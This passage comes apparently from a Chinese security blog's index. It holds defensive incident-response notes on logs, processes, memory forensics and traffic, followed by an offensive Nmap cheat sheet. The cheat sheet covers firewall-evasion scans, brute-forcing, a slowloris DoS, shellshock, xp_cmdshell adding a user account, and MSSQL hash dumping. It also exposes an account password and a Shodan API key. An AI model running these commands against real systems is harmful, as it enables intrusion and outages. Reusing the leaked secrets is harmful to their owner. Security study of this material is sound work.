查看所有进程的映像名称、服务、PID、会话名等信息tasklist /svc  &amp;rem 查看进程映像名，PID，服务tasklist /m    &amp;rem 查看所有进程加载的DLL文件tasklist /m  ntdll.dll  &amp;rem 查看调用指定ntdll.dll文件的进程</code></pre><h5 id="使用netstat查看"><a href="#使用netstat查看" class="headerlink" title="使用netstat查看"></a>使用<code>netstat</code>查看</h5><p>重点关注是否暴露135、445、3389等高危端口</p><pre><code class="zsh">netstat -anb | findstr &quot;ESTABLISHED&quot;  &amp;rem 查看端口连接情况及端口对应的程序，需要管理员权限netstat -ano | findstr &quot;ESTABLISHED&quot;  &amp;rem 查看目前已建立的网络连接，可定位PIDtasklist | findstr &lt;PID&gt;  &amp;rem 定位具体的程序</code></pre><h5 id="使用【PowerShell】查看"><a href="#使用【PowerShell】查看" class="headerlink" title="使用【PowerShell】查看"></a>使用【PowerShell】查看</h5><pre><code class="zsh">Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path   # 获取进程名，进程ID，PID，路径</code></pre><h5 id="使用【WMIC】查看"><a href="#使用【WMIC】查看" class="headerlink" title="使用【WMIC】查看"></a>使用【WMIC】查看</h5><blockquote><p>cmd下注释符 &amp;rem     PowerShell下注释符 #</p></blockquote><pre><code class="zsh">wmic process get name,parentprocessid,processid,executablepath， commandline /format:csv  &amp;rem 获取进程名，PID，ID,执行路径,命令行wmic process where processid=&lt;PID&gt; get name, executablepath &amp;rem 获取指定PID的进程名和执行路径wmic process where name=&quot;malware.exe&quot; call terminate &amp;rem 删除“malware.exe“恶意程序的进程wmic process where processid=&lt;PID&gt; delete  &amp;rem 删除&lt;PID&gt;的进程</code></pre><h4 id="Linux-5"><a href="#Linux-5" class="headerlink" title="Linux"></a>Linux</h4><pre><code class="zsh">netstat -antlp | more  # 查看进程、端口连接情况，可定位PIDls -alt /proc/&lt;PID&gt;/exe  # 可查看PID对应可执行程序lsof -p &lt;PID&gt;   # 查看PID对应的进程打开的文件systemctl status &lt;PID&gt; # 查看&lt;PID&gt;详细信息top #查看CPU占用情况free / cat /proc/meminfo   # 查看内存占用情况ps -e -o stat,ppid,pid,cmd | grep -e &#39;^[Zz]&#39; | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9 #批量删除僵尸进程ps aux | head -1; ps aux | sort -rn -k3 | head -10  #查看当前系统占用CPU最高的前10哥进程ps aux | head -1; ps aux | sort -rn -k4 | head -10  #查看当前系统占用内存最高的前10哥进程#查看隐藏进程ps -ef | awk &#39;&#123;print&#125;&#39; | sort -n | uniq &gt;1ls /proc | sort -n | uniq &gt;2diff 1 2</code></pre><h2 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h2><h3 id="Windows-5"><a href="#Windows-5" class="headerlink" title="Windows"></a>Windows</h3><p><img src="../images/resp-11.png" alt="resp-11"></p><h3 id="Linux-6"><a href="#Linux-6" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="zsh">chkconfig --list  # 查看系统运行的服务service --status-all ｜ more  # 查看所有服务的状态</code></pre><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>通过分析日志，可发现攻击源、攻击路径、新建账户、新建服务等。</p><h3 id="Windows-6"><a href="#Windows-6" class="headerlink" title="Windows"></a>Windows</h3><p>登陆相关日志事件ID及描述<br>|事件ID|名称|描述|<br>|:—:|:—:|:—|<br>|4624|用户登陆成功|大部分登陆事件成功时会产生的日志|<br>|4625|用户登陆失败|大部分登陆事件失败时产生的日志|<br>|4672|特殊权限用户登陆|Administrator登陆会产生的日志|<br>|4648|显式凭据登陆|使用<code>runas /user</code>以其他身份运行程序时产生的日志|</p><p>常用启动事件相关登陆事件ID及来源<br>|事件ID|名称|来源|<br>|:—:|:—:|:—|<br>|1074|关机初始化失败|User32|<br>|13|Windows关闭|Microsoft-Windows-Kernel-General|<br>|12|Windows启动|Microsoft-Windows-Kernel-General|</p><p>日志被清除相关事件ID及来源<br>|事件ID|名称|来源|<br>|:—:|:—:|:—|<br>|1100|事件日志服务关闭|Microsoft-Windows-EventLog|<br>|104|事件日志被清除|Microsoft-Windows-EventLog|</p><h4 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h4><h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><blockquote><p>Windows系统中各个组件在运行中产生的各种事件，包括：<br>    - 各种驱动程序出现的重大问题<br>    - 各种组件出现的重大问题<br>    - 应用软件出现的重大问题<br>    <strong>重大问题</strong>指重要数据的丢失、错误及令系统崩溃</p></blockquote><p>路径：   </p><ul><li>Win2000、WinXP、WinServer2003   <code>C:\WINDOWS\System32\config\SysEvent.evt</code></li><li>WinVista、Win7/8/10、Win2008及以后   <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li></ul><h5 id="安全性日志"><a href="#安全性日志" class="headerlink" title="安全性日志"></a>安全性日志</h5><blockquote><p>记录各种与安全相关的事件：<br>    - 登陆与退出系统操作<br>    - 对系统重要资源的操作，如增、删、改<br>路径：   </p></blockquote><ul><li>Win2000、WinXP、WinServer2003   <code>C:\WINDOWS\System32\config\SecEvent.evt</code></li><li>WinVista、Win7/8/10、Win2008及以后   <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li></ul><h5 id="应用程序日志"><a href="#应用程序日志" class="headerlink" title="应用程序日志"></a>应用程序日志</h5><blockquote><p>记录各种应用程序所产生的各类事件，包括：<br>    - MSSQL暴力破解</p></blockquote><p>路径：   </p><ul><li>Win2000、WinXP、WinServer2003   <code>C:\WINDOWS\System32\config\AppEvent.evt</code></li><li>WinVista、Win7/8/10、Win2008及以后   <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><h5 id="其他日志"><a href="#其他日志" class="headerlink" title="其他日志"></a>其他日志</h5><p>Dhcp、Bits-Client<br>路径：<br><code>%SystemRoot%\System32\Winevt\Logs</code></p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><ul><li>在勒索病毒事件处理中，主要查看创建任务计划、安装服务、关机、重启这样的异常操作。<br>主要检查登陆失败和登陆成功的日志，查看是否有异常的登陆行为，如暴力破解</li></ul><h5 id="通过内置日志筛选器进行分析"><a href="#通过内置日志筛选器进行分析" class="headerlink" title="通过内置日志筛选器进行分析"></a>通过内置日志筛选器进行分析</h5><p><code>Win+R</code>键后运行<code>eventvwr</code>即可打开事件查看器，查看相关日志<br>通过日志筛选器可对记录事件、事件级别、任务类别、关键字等信息进行筛选。<br><img src="../images/resp-12.png" alt="resp-12"></p><h5 id="通过Powershell进行日志分析"><a href="#通过Powershell进行日志分析" class="headerlink" title="通过Powershell进行日志分析"></a>通过Powershell进行日志分析</h5><blockquote><p>需要管理员权限</p></blockquote><ul><li><p><code>Get-EventLog</code></p><pre><code class="zsh">Get-EventLog Security -InstanceId 4625 # 获取登陆失败的日志</code></pre></li><li><p><code>Get-WinEvent</code> -推荐</p><pre><code class="zsh">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Security&#39;;ID=&#39;4625&#39;&#125;  # 获取登陆失败的日志</code></pre></li></ul><h5 id="通过相关日志工具进行分析查询"><a href="#通过相关日志工具进行分析查询" class="headerlink" title="通过相关日志工具进行分析查询"></a>通过相关日志工具进行分析查询</h5><ul><li><a href="https://www.snapfiles.com/get/fulleventlogview.html">FullEventLogView</a><br>一个轻量级日志检索工具，检索速度比Windows自带的检索工具要快，界面更好</li><li><a href="https://www.filehorse.com/download-event-log-explorer/">Event Log Explorer</a><br>一个检测系统安全的软件，可查看、监视和分析事件记录，包括安全性，系统，应用程序和其Windows系统事件记录</li><li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a><br>官方退出的日志分析工具，功能强大使用简单<pre><code class="zsh">LogParser.exe -i:EVT -o:DATAGRID &quot;SELETC * FROM C:\Security.evtx where EventID=4624&quot;  &amp;rem 查看所有成功登陆事件LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT * FROM C:\Security.evtx where TimeGenerated&gt;&#39;2020-8-1 23:59:59&#39; and TimeGenerated&lt;&#39;2020-9-1 23:59:59&#39; and EventID=4625&quot;  &amp;rem 查看指定时间内所有登陆失败的日志LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM C:\System.evtx where EventID=12 or EventID=13&quot; &amp;rem 查看系统历史开关机记录</code></pre></li></ul><h3 id="Linux-7"><a href="#Linux-7" class="headerlink" title="Linux"></a>Linux</h3><p>系统日志一般存放在<code>/var/log/</code>目录下：</p><ul><li>查看所有用户最后的登陆信息 <code>lastlog</code></li><li>查看用户登陆失败信息 <code>lastb</code></li><li>查看用户最近登陆信息 <code>last</code></li></ul><h4 id="日志路径介绍"><a href="#日志路径介绍" class="headerlink" title="日志路径介绍"></a>日志路径介绍</h4><p>日志文件及描述<br>|文件|描述|<br>|:—:|:—|<br>|/var/log/wtmp|记录登陆、退出、关机、重启等操作，即last|<br>|/var/log/cron|记录与定时任务相关的日志信息|<br>|/var/log/messages|记录系统启动后的信息和错误日志|<br>|/var/log/apache2/access.log|记录Apache访问日志|<br>|/var/log/auth.log|记录系统授权信息，包括用户登陆和使用过的授权|<br>|/var/log/userlog|记录所有等级用户信息的日志|<br>|/var/log/xferlog(vsftpd.log)|记录Linux FTP日志|<br>|/var/log/lastlog|记录登陆的用户|<br>|/var/log/secure|记录大多数应用输入的账户与密码，以及登陆成功与否|<br>|/var/log/faillog|记录登陆失败的日志|</p><h4 id="日志分析-2"><a href="#日志分析-2" class="headerlink" title="日志分析"></a>日志分析</h4><pre><code class="zsh">cat /var/log/cron  #查看任务计划相关的操作日志cat /var/log/messages  # 查看整体系统信息cat /var/log/secure #查看验证和授权方面的信息cat /var/spool/mail/root  # 查看root邮件中的信息ls -alt /var/spool/mail # 查看邮件相关日志记录文件</code></pre><h3 id="其他日志位置"><a href="#其他日志位置" class="headerlink" title="其他日志位置"></a>其他日志位置</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><code>%SystemDrive%\inetpub\logs\LogFiles</code></li><li><code>%SystemRoot%\System32\LogFiles\W3SVC1</code></li><li><code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1</code></li><li><code>%SYstemDrive%\Windows\System32\LogFiles\HTTPERR</code></li></ul><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ul><li><code>/var/log/httpd/access.log</code></li><li><code>/var/log/apache/access.log</code></li><li><code>/var/log/apache2/access.log</code></li><li><code>/var/log/httpd-access.log</code><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><blockquote><p>可通过nginx.conf查看</p></blockquote></li><li><code>/var/local/nginx/logs/access.log</code></li><li><code>/var/local/nginx/logs/error.log</code></li></ul><h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h4><ul><li><code>TOMCAT_HOME/logs/</code></li></ul><h4 id="Vsftp"><a href="#Vsftp" class="headerlink" title="Vsftp"></a>Vsftp</h4><p>查看 <code>/etc/vsftp/vsftp.conf</code></p><h4 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h4><p>默认情况下，WebLogic有以下三种日志：</p><ul><li>access.log <code>$MW_HOME\user_projects\domains\&lt;domain_name&gt;\servers\&lt;server_name&gt;\logs\access.log</code></li><li>server.log <code>$MW_HOME\user_projects\domains\&lt;domain_name&gt;\servers\&lt;server_name&gt;\logs\&lt;server_name&gt;.log</code></li><li>domain.log <code>$MW_HOME\user_projects\domains\&lt;domain_name&gt;\servers\&lt;adminserver_name&gt;\logs\&lt;domain_name&gt;.log</code></li></ul><h4 id="数据库日志"><a href="#数据库日志" class="headerlink" title="数据库日志"></a>数据库日志</h4><h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><blockquote><p>默认路径 <code>$ORACLE/rdbms/log/</code></p></blockquote><pre><code class="zsh">select * from v$logfile</code></pre><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><blockquote><p>默认路径 <code>/var/log/mysql</code></p></blockquote><pre><code class="zsh">show variables like &#39;log_%&#39;    # 查看是否启用日志show variables like &#39;general&#39;  # 查看日志位置</code></pre><h5 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h5><p>登陆<strong>SQL Server Management Studio</strong>, 在<strong>管理</strong>-<strong>SQL Server日志</strong>中查看</p><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><h3 id="内存的获取"><a href="#内存的获取" class="headerlink" title="内存的获取"></a>内存的获取</h3><h4 id="基于内核模式程序的内存获取"><a href="#基于内核模式程序的内存获取" class="headerlink" title="基于内核模式程序的内存获取"></a>基于内核模式程序的内存获取</h4><p>可使用以下工具进行获取：</p><ul><li>Dumpit</li><li>Redline</li><li>RAM Capturer</li><li>FTK Imager</li></ul><h4 id="基于系统崩溃转出的内存获取"><a href="#基于系统崩溃转出的内存获取" class="headerlink" title="基于系统崩溃转出的内存获取"></a>基于系统崩溃转出的内存获取</h4><p>按<code>Win+R</code>运行<code>sysdm.cpl</code>找到存储文件 <code>%SystemRoot%\MEMORY.DMP</code><br><img src="../images/resp-13.png" alt="resp-13"></p><h4 id="基于虚拟化快照的内存获取"><a href="#基于虚拟化快照的内存获取" class="headerlink" title="基于虚拟化快照的内存获取"></a>基于虚拟化快照的内存获取</h4><p>通过VMware Workstation、 ESXI等虚拟机软件实现的</p><h3 id="内存分析-1"><a href="#内存分析-1" class="headerlink" title="内存分析"></a>内存分析</h3><ul><li><p>Redline<br>获取内存文件后，导入到Redline进行分析，其主要收集在主机上运行的有关进程信息、内存中的驱动程序、及其他数据(元数据、注册表数据、任务、服务、网络信息、Internet历史记录等)，最终生成报告</p></li><li><p>Volatility<br>一个开源的内存取证工具，可以分析入侵攻击痕迹，包括网络连接、进程、服务、驱动模块、DLL、handles、进程注入、cmd历史命令、IE历史记录、启动项、用户、shimcache、userassist、部分rootkit隐藏文件、cmdliner等。</p><pre><code class="zsh">volatility -f /root/2020.mem  --profile=Win2008R2SP1x64 netscan  #查看内存镜像中的网络连接volatility -f /root/2020.mem  --profile=Win2008R2SP1x64 psxview  #查看内存镜像中带有隐藏进程的所有进程列表volatility -f /root/2020.mem  --profile=Win2008R2SP1x64 malfind  #查看内存镜像中隐藏或注入的代码volatility -f /root/2020.mem  --profile=Win2008R2SP1x64 cmdscan  #查看内存镜像中执行的相关历史命令记录volatility -f /root/2020.mem  --profile=Win2008R2SP1x64 procdump -p &lt;PID&gt; -D  #提取内存镜像中指定的进程文件，将提取的进程文件上传到virustotal平台进行扫描。</code></pre></li></ul><pre><code>## 流量分析- Wireshark - tcpdump若数据包中带有z0、eval、base64_decode,则数据包很可能是中国菜刀客户端流量若数据包中带有特殊的Referer、Accept-Language，则数据包可能是Weevely Webshll流量若数据包中含有[**PSH**,ACK],一般是利用msf中的reverse_tcp上线Wireshark筛选器过滤命令```zshHTTP   # 对协议进行过滤 ，HTTPS，SMTP，ARP等ip.addr==&lt;ip&gt;   #对特定ip地址进行过滤ip.src==&lt;ip&gt;    #对指定的源ip进行过滤tcp.port==&lt;port&gt;  #对tcp端口进行过滤udp.port==&lt;port&gt;  #对udp端口进行过滤tcp contains &lt;string&gt; # 对特定字符串进行过滤</code></pre><ol><li>分析内网是否存在针对445端口的扫描和MS17-010漏洞的利用</li><li>分析溯源勒索终端被入侵的过程</li><li>分析邮件附件MD5值匹配威胁情报的数据，判定是否为勒索病毒</li><li>分析网络中传播的文件是否被二次打包，进行植入式攻击</li><li>分析在正常网页中植入密码，让访问者在浏览网页时利用IE浏览器或Flash等软件漏洞实施攻击的情况</li></ol><h2 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h2><ul><li><a href="https://www.virustotal.com/gui/">Virustotal</a></li><li><a href="https://x.threatbook.cn/">微步威胁平台</a></li><li><a href="https://www.threatcrowd.org/">Threat Crowd</a></li><li><a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></li><li><a href="https://ti.360.cn/#/homepage">360威胁情报中心</a></li><li><a href="https://nti.nsfocus.com/">绿盟威胁情报中心</a></li><li><a href="https://www.venuseye.com.cn/">启明VenusEye威胁情报中心</a></li><li><a href="https://ti.dbappsecurity.com.cn/">安恒威胁情报中心</a></li><li><a href="https://redqueen.tj-un.com/IntelHome.html">RedQueen安全智能服务平台</a></li><li><a href="https://exchange.xforce.ibmcloud.com/">IBM情报中心</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Response </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="Tools/Nmap.html"/>
      <url>Tools/Nmap.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://svn.nmap.org/nmap/nmap-services">Nmap服务列表</a></p><h2 id="Nmap常用扫描案例"><a href="#Nmap常用扫描案例" class="headerlink" title="Nmap常用扫描案例"></a>Nmap常用扫描案例</h2><p><code>指定网络接口 -e eth0</code><br>使用nmap 绕过防火墙<br>1 碎片扫描</p><pre><code class="zsh">root@kali:~# nmap -f m.anzhi.comroot@kali:~# nmap -mtu 8 m.anzhi.com2 诱饵扫描root@kali:~# nmap -D RND:10 m.anzhi.comroot@kali:~# nmap –D decoy1,decoy2,decoy3 m.anzhi.com3 僵尸扫描root@kali:~# nmap 192.168.8.0/24 --script=ipidseq   #探测僵尸主机root@kali:~# nmap -P0 -sI zombie m.anzhi.com4 随机数据长度root@kali:~# nmap --data-length 25 m.anzhi.comroot@kali:~# nmap --randomize-hosts 103.17.40.69-100root@kali:~# nmap -sl 211.211.211.211m.anzhi.com5 欺骗扫描root@kali:~# nmap --sT -PN --spoof-mac 0 m.anzhi.comroot@kali:~# nmap --badsum m.anzhi.comroot@kali:~# nmap -g 80 -S www.baidu.com m.anzhi.comroot@kali:~# nmap -p80 --script http-methods --script-args http.useragent=”Mozilla 5”m.anzhi.com</code></pre><h3 id="探测CVE漏洞"><a href="#探测CVE漏洞" class="headerlink" title="探测CVE漏洞"></a>探测CVE漏洞</h3><pre><code class="bash">cd /usr/share/nmap/scripts/##git clone https://github.com/vulnersCom/nmap-vulners.gitwget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nsegit clone https://github.com/scipag/vulscan.gitcd vulscan/utilities/updaterchmod +x updateFiles.sh | ./updateFiles.shnmap --script nmap-vulners，vulscan --script-args vulscandb = scipvuldb.csv -sV &lt;Target&gt;#banner-plus$ wget https://raw.githubusercontent.com/hdm/scan-tools/master/nse/banner-plus.nse# for MacOS$ cp banner-plus.nse /usr/local/share/nmap/scripts/# for Linux$ cp banner-plus.nse /usr/share/nmap/scripts/</code></pre><p>使用代理，加脚本</p><pre><code class="zsh">nmap --script &quot;not intrusive&quot; &lt;ip&gt;  --proxy socks4://127.0.0.1:18080 </code></pre><p>查找开放端口</p><pre><code class="zsh"> cat file.txt| grep &quot;\d/&quot; | cut  -f1 -d &quot;/&quot;</code></pre><pre><code class="zsh"> ( cat file.txt| grep &quot;\d/&quot; | cut  -f1 -d &quot;/&quot; | tr &quot;&quot; &quot;,&quot; ) &gt;/var/tmp/aa.tx</code></pre><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="NSE脚本搜索"><a href="#NSE脚本搜索" class="headerlink" title="NSE脚本搜索"></a>NSE脚本搜索</h3><pre><code class="zsh">    bing/baidu/google:                intext: nsedoc/scripts &lt;script_name&gt;     nmap --script-help &lt;script-name&gt;</code></pre><h3 id="查看脚本数量"><a href="#查看脚本数量" class="headerlink" title="查看脚本数量"></a>查看脚本数量</h3><pre><code class="zsh">ls /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts | wc -l</code></pre><h3 id="更新NSE"><a href="#更新NSE" class="headerlink" title="更新NSE"></a>更新NSE</h3><pre><code class="zsh">    nmap --script-updatedb代理扫描nmap -sV -Pn -n --proxies socks4://127.0.0.1:9050 scanme.nmap.org</code></pre><h3 id="IP地址定位"><a href="#IP地址定位" class="headerlink" title="IP地址定位"></a>IP地址定位</h3><h4 id="ip-geolocation-maxmind"><a href="#ip-geolocation-maxmind" class="headerlink" title="ip-geolocation-maxmind"></a>ip-geolocation-maxmind</h4><p>下载<a href="https://www.maxmind.com/en/accounts/249487/geoip/downloads">Maxmind’GeoLite City</a><br>email:nichola.null     password:XtTSHkEGkfbB6st</p><pre><code class="zsh">cp GeoLite2-City_20200317.tar.gz  /usr/share/nmap/nselib/datatar -zxvf GeoLite2-City_20200317.tar.gznmap --script ip-geolocation-maxmind &lt;target&gt; [--script-args ip-geolocation.maxmind_db=&lt;filename&gt;]</code></pre><h4 id="ipinfodb"><a href="#ipinfodb" class="headerlink" title="ipinfodb"></a>ipinfodb</h4><p>获取<a href="https://ipinfodb.com/register">API</a></p><pre><code class="zsh">nmap --script ip-geolocation-ipinfodb &lt;target&gt; --script-args ip-geolocation-ipinfodb.apikey=&lt;API_key&gt;</code></pre><h3 id="获取Whois记录"><a href="#获取Whois记录" class="headerlink" title="获取Whois记录"></a>获取Whois记录</h3><pre><code class="zsh">nmap --script &quot;whois-*&quot; --script-args whodb=nocache target </code></pre><h3 id="从Shodan获取目标信息"><a href="#从Shodan获取目标信息" class="headerlink" title="从Shodan获取目标信息"></a>从Shodan获取目标信息</h3><pre><code class="zsh">vi /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts/shodan-api.nseset local apiKey = &quot;7VYpw5QnxgWeww59w7sX7jD6up7Qth9a&quot; nmap  -sn -Pn -n --script shodan-api  --script-args &#39;shodan-api.outfile=potato.csv&#39; x.y.z.0/24</code></pre><h3 id="探测WAF"><a href="#探测WAF" class="headerlink" title="探测WAF"></a>探测WAF</h3><pre><code class="zsh">nmap --script &quot;http-waf-*&quot; &lt;target&gt;</code></pre><h3 id="探测代理"><a href="#探测代理" class="headerlink" title="探测代理"></a>探测代理</h3><pre><code class="zsh">nmap --script http-open-proxy &lt;target&gt;</code></pre><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><pre><code class="zsh">nmap --script http-enum &lt;target&gt;    目录探测nmap --script http-userdir-enum &lt;target&gt; 用户名探测    </code></pre><h3 id="扫描XSS"><a href="#扫描XSS" class="headerlink" title="扫描XSS"></a>扫描XSS</h3><pre><code class="zsh">nmap -p80 --script http-unsafe-output-escaping,http-xssed,http-phpself-xss &lt;target&gt;</code></pre><h3 id="扫描SQL注入"><a href="#扫描SQL注入" class="headerlink" title="扫描SQL注入"></a>扫描SQL注入</h3><pre><code class="zsh">nmap -p80 --script http-sql-injection &lt;target&gt;</code></pre><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><pre><code class="zsh">nmap -p80 --script http-slowloris --max-parallelism 400 &lt;target&gt;</code></pre><h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><pre><code class="zsh">nmap -sV --script http-shellshock &lt;target&gt;nmap -sV --script http-shellshock --script-args cmd=ls &lt;target&gt;</code></pre><h3 id="git目录"><a href="#git目录" class="headerlink" title="git目录"></a>git目录</h3><pre><code class="zsh">nmap -p80 --script http-git &lt;target&gt;nmap -p443 --script http-svn-info &lt;target&gt;</code></pre><h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><pre><code class="zsh">nmap -p443 --script ssl* &lt;target&gt;</code></pre><h3 id="扫描HeartBleed漏洞"><a href="#扫描HeartBleed漏洞" class="headerlink" title="扫描HeartBleed漏洞"></a>扫描HeartBleed漏洞</h3><pre><code class="zsh">    nmap  -sV  -p -sV 443  -sV  –script ssl-heartbleed –script-args vulns.showall &lt;target&gt;</code></pre><h3 id="扫描SNMP服务"><a href="#扫描SNMP服务" class="headerlink" title="扫描SNMP服务"></a>扫描SNMP服务</h3><pre><code class="zsh">    nmap -sU  -sV  -p -sV 161 --script snmp-brute [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]&lt;target&gt;</code></pre><h3 id="扫描DHCP服务"><a href="#扫描DHCP服务" class="headerlink" title="扫描DHCP服务"></a>扫描DHCP服务</h3><pre><code class="zsh">    nmap -sU -sV  -p -sV 67 --script=dhcp-discover 192.168.1.0/24</code></pre><h3 id="扫描Daytime服务"><a href="#扫描Daytime服务" class="headerlink" title="扫描Daytime服务"></a>扫描Daytime服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 13 --script=daytime &lt;target&gt;</code></pre><h3 id="扫描NTP服务"><a href="#扫描NTP服务" class="headerlink" title="扫描NTP服务"></a>扫描NTP服务</h3><pre><code class="zsh">    nmap -sU -sV  -p -sV 123 --script ntp-info &lt;target&gt;</code></pre><h3 id="扫描LLTD服务"><a href="#扫描LLTD服务" class="headerlink" title="扫描LLTD服务"></a>扫描LLTD服务</h3><pre><code class="zsh">    nmap script lltd-discovery --script-args=lltd-discovery.interface=en0,netwtargets=&lt;target&gt;</code></pre><h3 id="扫描NetBIOS服务"><a href="#扫描NetBIOS服务" class="headerlink" title="扫描NetBIOS服务"></a>扫描NetBIOS服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 137 -sU --script nbstat &lt;target&gt;</code></pre><h3 id="扫描苹果AFP服务"><a href="#扫描苹果AFP服务" class="headerlink" title="扫描苹果AFP服务"></a>扫描苹果AFP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 548 --script=afp-serverinfo &lt;target&gt; [--script-args=afp.password=password,afp.username=username]</code></pre><h3 id="扫描DAAP服务"><a href="#扫描DAAP服务" class="headerlink" title="扫描DAAP服务"></a>扫描DAAP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 3689 --script=daap-get-library &lt;target&gt; [--script-args daap_item_limit=number]</code></pre><h3 id="扫描NFS服务"><a href="#扫描NFS服务" class="headerlink" title="扫描NFS服务"></a>扫描NFS服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 111 --script nfs-ls,nfs-showmount &lt;target&gt;</code></pre><h3 id="扫描AJP服务"><a href="#扫描AJP服务" class="headerlink" title="扫描AJP服务"></a>扫描AJP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 8009 --script ajp-* &lt;target&gt; [--script-args=ajp-auth.path=/login]</code></pre><h3 id="2-9-2-扫描ASP-NET服务"><a href="#2-9-2-扫描ASP-NET服务" class="headerlink" title="2.9.2. 扫描ASP.NET服务"></a>2.9.2. 扫描ASP.NET服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 80 --script=http-aspnet-debug  [--script-args=http-aspnet-debug.path=path] &lt;target&gt;</code></pre><h3 id="扫描HTTP认证服务"><a href="#扫描HTTP认证服务" class="headerlink" title="扫描HTTP认证服务"></a>扫描HTTP认证服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 80 --script http-auth [--script-args=http-auth.path=/login] &lt;host&gt;</code></pre><h3 id="扫描SSL服务"><a href="#扫描SSL服务" class="headerlink" title="扫描SSL服务"></a>扫描SSL服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 443 --script ssl-*,sslv2-sV  -p -sV,tls-alpn,tls-nextprotoneg &lt;host&gt;</code></pre><h3 id="Memcache数据库"><a href="#Memcache数据库" class="headerlink" title="Memcache数据库"></a>Memcache数据库</h3><pre><code class="zsh">    nmap -sV -p11211 --script memcached-info &lt;host&gt;</code></pre><h3 id="扫描DB2数据库"><a href="#扫描DB2数据库" class="headerlink" title="扫描DB2数据库"></a>扫描DB2数据库</h3><pre><code class="zsh">    nmap --script broacast-db2-discover ,db2-das-info &lt;host&gt;</code></pre><h3 id="扫描SQL-Server服务"><a href="#扫描SQL-Server服务" class="headerlink" title="扫描SQL Server服务"></a>扫描SQL Server服务</h3><pre><code class="zsh">     获取mssql信息                        # nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24    扫描mssql sa空密码                    # nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24     sa弱口令爆破                         # nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24     利用xp_cmdshell,远程执行系统命令       # nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24    导出mssql中所有的数据库用户及密码hash        # nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24</code></pre><h3 id="扫描Cassandra服务"><a href="#扫描Cassandra服务" class="headerlink" title="扫描Cassandra服务"></a>扫描Cassandra服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 9160 --script cassandra-info &lt;host&gt;</code></pre><h3 id="扫描MongoDB相关服务"><a href="#扫描MongoDB相关服务" class="headerlink" title="扫描MongoDB相关服务"></a>扫描MongoDB相关服务</h3><pre><code class="zsh"> 尝试爆破mongdb                     # nmap -p 27017  --script mongodb-brute 192.168.3.0/24验证mongodb未访问授权               # nmap -p27017  —script mongodb-info  192.168.3.0/24</code></pre><h3 id="扫描Informix服务"><a href="#扫描Informix服务" class="headerlink" title="扫描Informix服务"></a>扫描Informix服务</h3><pre><code 